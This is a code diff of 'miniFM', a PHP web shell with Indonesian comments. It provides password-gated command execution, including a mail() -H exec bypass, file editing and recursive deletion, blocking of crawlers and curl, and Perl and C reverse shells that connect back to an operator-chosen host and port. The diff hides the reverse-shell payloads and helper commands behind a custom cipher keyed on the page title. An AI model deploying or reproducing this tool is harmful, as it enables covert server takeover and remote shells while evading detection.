@@ -5,8 +5,8 @@
 @ini_set('max_execution_time',0);
 @ini_set('memory_limit', '128M');
 @error_reporting(0);
-$stitle = ".:: [ miniFM ] ::.";
-$sfooter = "[ orang_dalam ]";
+$stitle = ".:: [ miniFM ] ::."; /* jangan diganti kalo kamu ingin fitur backconnect tetap bekerja! */
+$sfooter = "[ orang_dalam ]"; /* diganti gkpp, gk ngaruh! */
 $auth_pass = '$2y$10$u0LRXNXe3JeFZuQSrIrASu3Puc.wNLrtXWvRntANJ8h03Xfnnr4YK';
 $webprotocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ? "https://" : "http://";
 $weburl	= $webprotocol . $_SERVER['HTTP_HOST'] . dirname($_SERVER['PHP_SELF']);
@@ -34,13 +34,18 @@ if(!function_exists("scandir")){function scandir($dir) { $dh = @opendir($dir); w
 function blockCrawler(){
 	if(!empty($_SERVER['HTTP_USER_AGENT'])){
 		$ua = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot", "curl");
-		if(preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit(0);}
+		if(preg_match('/' . implode('|', $ua) . '/i', $_SERVER['HTTP_USER_AGENT'])){
+			header('HTTP/1.0 404 Not Found');
+			exit(0);
+		}
 	}
 }
 function disFunc(){ $df = function_exists('ini_get') ? @ini_get('disable_functions') : ''; return (!empty($df) ? explode(',', $df) : array());}
 function AvFunc($list = array()){
 	foreach($list as $entry){
-		if(function_exists($entry) && !in_array($entry, disFunc())){return true;}
+		if(function_exists($entry) && !in_array($entry, disFunc())){
+			return true;
+		}
 	}
 	return false;
 }
@@ -48,14 +53,18 @@ function serverSecInfo(){
 	function serverPanel(){
 		$pn = array('/usr/local/cpanel' => 'cPanel', '/usr/local/hpanel' => 'hPanel (Hostinger)', '/usr/local/psa' => 'Plesk', '/usr/local/webuzo' => 'Webuzo', '/usr/local/vesta' => 'Vesta CP', '/usr/share/webmin' => 'Virtualmin', '/www/server/panel' => 'aaPanel', '/opt/neoistone' => 'NS Panel', '/etc/neoistone' => 'NS Panel', '/usr/local/neoistone' => 'NS Panel', '/usr/local/mgr5' => 'ISP Manager', '/usr/local/mgr6' => 'ISP Manager', '/usr/local/home/admispconfig'	=> 'ISP Config', '/usr/local/directadmin' => 'Direct Admin', '/usr/local/solusvm/www' => 'SolusVM', '/usr/local/lxlabs/kloxo' => 'Kloxo', '/usr/local/cwp' => 'CentOS WebPanel', '/usr/local/cwpsrv' => 'CentOS WebPanel', '/var/www/html/froxlor-latest' => 'Froxlor', '/var/www/html/froxlor' => 'Froxlor', '/etc/ajenti/' => 'Ajenti');
 		foreach($pn as $kpn => $vpn){
-			if(@is_dir($kpn)){$npn[] = $vpn;}
+			if(@is_dir($kpn)){
+				$npn[] = $vpn;
+			}
 		}
 		return isset($npn) ? implode(', ', array_values(array_unique($npn))) : 'Unknown';
 	}
 	function showInf($n, $v){
 		$x = '';
 		$v = trim($v);
-		if($v){$x .= '<p class="mt-3 mb-0 text-cyan">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer" style="color:#cfdce8!important;">'.$v.'</footer>' : '<footer class="blockquote-footer"><pre class="pre-scrollable mb-0">'.$v.'</pre></footer>';}
+		if($v){
+			$x .= '<p class="mt-3 mb-0 text-cyan">'.$n.': </p>'; $x .= strpos($v, "\n") == false ? '<footer class="blockquote-footer" style="color:#cfdce8!important;">'.$v.'</footer>' : '<footer class="blockquote-footer"><pre class="pre-scrollable mb-0">'.$v.'</pre></footer>';
+		}
 		return $x;
 	}
 	if(AvFunc(array('mysql_get_client_info'))){$temp[] = "MySQL (" . @mysql_get_client_info(). ")";}
@@ -118,8 +127,15 @@ function fType($a,$c=null){
 	}
 	return $b;
 }
+function encode($value,$keys) {if(!$value){return false;}$key = sha1($keys);$strLen = strlen($value);$keyLen = strlen($key);$j = 0;$crypttext = ''; for ($i = 0; $i < $strLen; $i++) {$ordStr = ord(substr($value, $i, 1));if ($j == $keyLen) {$j = 0;}$ordKey = ord(substr($key, $j, 1));$j++;$crypttext .= strrev(base_convert(dechex($ordStr + $ordKey), 16, 36));}return $crypttext;}
+function decode($value,$keys) {if(!$value){return false;}$key = sha1($keys);$strLen = strlen($value);$keyLen = strlen($key);$j = 0;$decrypttext = '';for ($i = 0; $i < $strLen; $i += 2) {$ordStr = hexdec(base_convert(strrev(substr($value, $i, 2)), 36, 16));if ($j == $keyLen) {$j = 0;}$ordKey = ord(substr($key, $j, 1));$j++;$decrypttext .= chr($ordStr - $ordKey);}return $decrypttext;}
+function generate($_a1a,$_a2a){ return $_a1a == 'encode' ? encode($_a2a,$GLOBALS['stitle']) : decode($_a2a,$GLOBALS['stitle']);}
 function procopen($cmd){
-	$descspek = array(1 => array("pipe", "w"), 0 => array("pipe", "r"), 2 => array("pipe", "w"));
+	$descspek = array(
+		1 => array("pipe", "w"),
+		0 => array("pipe", "r"),
+		2 => array("pipe", "w")
+	);
 	try {
 		if(AvFunc(array('proc_open','proc_close','fread','feof','fclose'))){
 			$process = @proc_open($cmd, $descspek, $pipes);
@@ -151,7 +167,11 @@ function fakemail($func, $cmd){
 	$cmds = "{$cmd} > geiss.txt";
 	cf('geiss.sh', base64_encode(@iconv("UTF-8", "ISO-8859-1//IGNORE", addcslashes("#!/bin/sh\n{$cmds}","\r\t\0"))));
 	@chmod('geiss.sh', 0777);
-	$send = $func == 'mail' ? @mail("root@root", "", "", "", '-H \"exec geiss.sh\"') : @mb_send_mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
+	if($func == 'mail'){
+		$send = @mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
+	} else {
+		$send = @mb_send_mail("root@root", "", "", "", '-H \"exec geiss.sh\"');
+	}
 	if($send){@file_get_contents("geiss.txt");}
 	return sleep(5);
 }
@@ -168,7 +188,10 @@ function cf($f,$t){
 		}		
 	}
 }
-function expandPath($path){ if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ cmd("echo $match[1]", $stdout); return $stdout[0] . $match[2];} return $path;}
+function expandPath($path) {
+    if(preg_match("#^(~[a-zA-Z0-9_.-]*)(/.*)?$#", $path, $match)){ cmd("echo $match[1]", $stdout); return $stdout[0] . $match[2];}
+    return $path;
+}
 function cmd($cmdx, $path){
     $stdout = '';
 	if(AvFunc(array('chdir'))){
@@ -270,7 +293,9 @@ function xrmdir($dir){
 	$items = @scandir($dir);
 	if($items){
 		foreach($items as $item) {
-			if($item === '.' || $item === '..'){continue;}
+			if($item === '.' || $item === '..'){
+				continue;
+			}
 			$path = $dir.'/'.$item;
 			if(@is_dir($path)){ xrmdir($path); } else { @unlink($path); }
 		}
@@ -313,7 +338,9 @@ function pathberkas($a){
 			$outs .= '<li class="breadcrumb-item dir'.$id.'"><a href="#!" id="ffmanager" data-li="'.$id.'" data-path="';
 			for($i=0;$i<=$id;$i++){
 				$outs .= $lb[$i];
-				if($i != $id){$outs .= '/';}
+				if($i != $id){
+					$outs .= '/';
+				}
 			}
 			$outs .= '">'.$lok.'</a></li>';
 		}
@@ -438,7 +465,10 @@ if(isset($_GET['act'])){
 					if(!file_exists($xpath)){
 						if(AvFunc(array('fopen','fclose'))){
 							$fp = @fopen($xpath, 'w');
-							if($fp){$xpath = "ok, tinggal di edit..";fclose($fp);}
+							if($fp){
+								$xpath = "ok, tinggal di edit..";
+								fclose($fp);
+							}
 							$outs = "File berhasil dibuat!";
 						} else if(AvFunc(array('file_put_contents'))){
 							file_put_contents($xpath, "");
@@ -464,7 +494,10 @@ if(isset($_GET['act'])){
 				if(@filesize($xpath)>0){
 					if(AvFunc(array('fopen','fread','fclose','feof'))){
 						$fp = @fopen($xpath, 'r');
-						if($fp){while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}@fclose($fp);}
+						if($fp){
+							while(!@feof($fp)){$outs .= htmlspecialchars(@fread($fp, @filesize($xpath)));}
+							@fclose($fp);
+						}
 					} else if(AvFunc(array('file_get_contents'))){
 						$outs = @file_get_contents($df);
 					} else {
@@ -622,11 +655,11 @@ if(isset($_GET['act'])){
 				}
 			} else if($_POST['btype'] == 2){
 				$bcfile = $_POST['xpath']."/bc.pl";
-				$cf = cf($bcfile, "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
+				$cf = cf($bcfile, generate("decode", "i356o4z57485r3v4l384l3v544p54336u365u4z5g3q3h4s2i5u245n565q2y2f494q2r3r2y40614h3j3r4r5l5x3r4v3v4p395j406w385t3m5t3652526a4e484e405u3t4s475c4k4s404n3c4a4l5p40694z3r4r5p5i3n4n3g384w5l31654q5m4n5e3l4q4j5a4e4e3j4y4r434v4v4c373d424b3n3s4z455v4o4y364z5l5x3r4v3v4x384j406h3n4t3m4p3p5k575z3v4b374v4b3k4r5i5r3b3g424c3e3j4s4p416y2i3r415t5x335g4f4r3a5l3464474k3a4d3l415o504g3t2c4u4s3y5y4o494n3s4b4d4y2r2h53624g4z385150664t563u27484l38444t5h306u315n5u5c4g3j3q4t4t4q5b4p4l3h4v4a4q2j3l49555y4h4u344c4l4q344z3v3l3p4d305o3s543u4o3p56555o3c373r335s2x4w495p2j3u3x3b4r39335050694j3s4l4265474v3s4k355d3b484n4d3r5145555v5l3g4r3s4i5h4c456059463g4l3q3p4o4s4m5o5x2d315v5n5546423r4z395p334h3q4p305l32406q4y3c3o4a4t4g3l4o5b5b3n3u4n3n373z2l5k4j4d4647545s5g3r5z3v484v54346l3p5c3r5d3454616l3e4c4y2n4p3v526k5b3r3q4n3a3j3s315m4p5l3l3n4k4m5n3p534u3t364p3v4o365s3p5f325z5y4f3i4y2q495v374v565p2n3e3w3p2r3s3v4k4i4b4p3p59515r344r3m3r385s3o5h345q4y473r5d43624w3t2i445t215p435q3f3s3o37363c4z4m575q3t344x4t4p365u3f4k365q4x493u5p394345425s5a4s384h4v4u2t4w5j594y2v4947363n4g505g5i4o33634s4w364x4s48484w3u5r354t3p4n33584w5r3s4p2i385u23626k5q2q3k4x3p2n3c3352435r3k345y5v4a3t5r3p47494p3r5h3q4p355m3n46535x3e4c4y2"));
 				if($cf){
 					if(which('perl')){
 						$out = cmd("perl {$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $_POST['xpath']);
-						$outs = $out['stdout']."\n".cmd("ps aux | grep bc.pl")['stdout'];						
+						$outs = $out['stdout']."\n".cmd("".generate("decode", "l4z5n3e5o446h2y4d2p5p4k5i4o394j5m2u5s5")."", $_POST['xpath'])['stdout'];						
 					} else {
 						$outs = 'reverse shell using perl: failed!';						
 					}
@@ -635,18 +668,18 @@ if(isset($_GET['act'])){
 				}
 			} else if($_POST['btype'] == 3){
 				$bcfile = "/tmp/bc.c";
-				$cf = cf($bcfile,"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9");
+				$cf = cf($bcfile, generate("decode", "i364r5y5w364x4v2z3t4w3m5m3s4p344u3p4s526o3i484m2n4p3u5q5i5r3u2f4a4c3r3e49505i4y28474r536j374r3s4y384r4r564n403v5k3l544v4l3v2d4o485u23654b5b3q3c4s3b3u2f4j5o4p5n4z38505z5447513r464q4z2x493t5j41644l4m40614w3d4o4u4f3r516l57373d4b4d454d4v4k4j4c464r4p426g3n4p4e484v5b454t354v2w5d3q4z5y4f3e463a4s4b3l4w5j5e4m3c424d4m3y2n4y4s594i3n4k4k56474v3v49495p334f3s4p326t34406o524g3n3s475u2r516u4c3j3l4a4a4k4l3m4m5i494i3n4l4o5w375z3q47484z2u5j335u436f325z5y4f3e463a4s4b3l466i5r3t2q4b4q2d4o4753475a47475r5w58435e333i3r4h3q4u344j4z4m34515b4g3q3g4a4s4b3k4n5k5q2d4q4o3e4j3j4h5p5a4p47474t414g3o4x2d464u4t31644u5o3v5t365252694s394b4i5h4j56485q4f394n3n3c4y2n4y4s594i3n4k4k56464l4r4l3w5p3v544s543o5u3p42556o3j4j39485v315r5k5946323l3b3d4o49555z484y37515o564p5h4e484v5b454t366h3k5f325z5y4f3e463a4s4b3l4t5b5736323l3c3j3p48534x5e494n4n5j4p3s563k3t3t5x345i3n4d345o324y4w404u2j3s345f455m455n3o4c4v3q373o345o5a4r3t354c425o354e3m4i3q4q4x493p5c3n5d3l4m4w524e463i4u4f3x426j5d4u2h414r2m3i495q5y4l4i3n4n53674s4n3v2y394s3m5546443q51444q4r524h3e3a4u4d4q5n5v4e4j3l4a494o4a4i534p5w2z375c4q5i3s4r3u284w5x3p564n4d3662444y4y514w3n3e4i5d4q5w5w4o3o4s4n3n373y2n4y4s594i3n4k4k5g3n4e3d4i3u4d3r554u5l32634n5n5p5t3v2y2o4h5h455q5l57373i414r3d4m4s4m5o5x2d315u5k5g3n4e3d4i3p4c3m5f3s4l3s544q46556a4e463q4y4r434v4u47363c4l3c3p2l3m4m5i494i3n4l4o57485e3v4k3t414q5i3n4c336f325z5y4f3e463a4s4b3l4r5l5s363u4n3b3v3e4v4k4i4q4k345y5v4a3p5e3d4i3p4d3q56485c356f3p4a5r5o3c363s4u4s3y5y4o49463c4l37373t4k555v4q2z37534s5g3p563f46495z2165464e4n5g355r5p5n3t3k4l3m4d4k4n5u47373f4a4b3y2t49505l5f4z3n4q584b315p433"));
 				if($cf){
 					if(which('gcc')){
-						$out = cmd("gcc -o /tmp/bc /tmp/bc.c", $_POST['xpath']);
+						$out = cmd("".generate("decode", "c4j5i5l3o2v5h2t2p4v5n42444j5f234k4r5w534a484n264")."", $_POST['xpath']);
 						@unlink("/tmp/bc.c");
 						$out = cmd("/tmp/bc {$_POST['bhost']} {$_POST['bport']} &", $_POST['xpath']);
-						$outs = cmd("ps aux | grep bc", "/tmp/")['stdout'];
+						$outs = cmd("".generate("decode", "l4z5n3e5o446h2y4d2p5p4k5i4o394j5")."", "/tmp/")['stdout'];
 					} else {
-						$outs = 'reverse shell using C: failed!';							
+						$outs = 'reverse shell using C: failed!';
 					}
 				} else {
-					$outs = 'reverse shell using C: failed!';	
+					$outs = 'reverse shell using C: failed!';
 				}
 			} else {
 				$outs = 'method gak tersedia!';
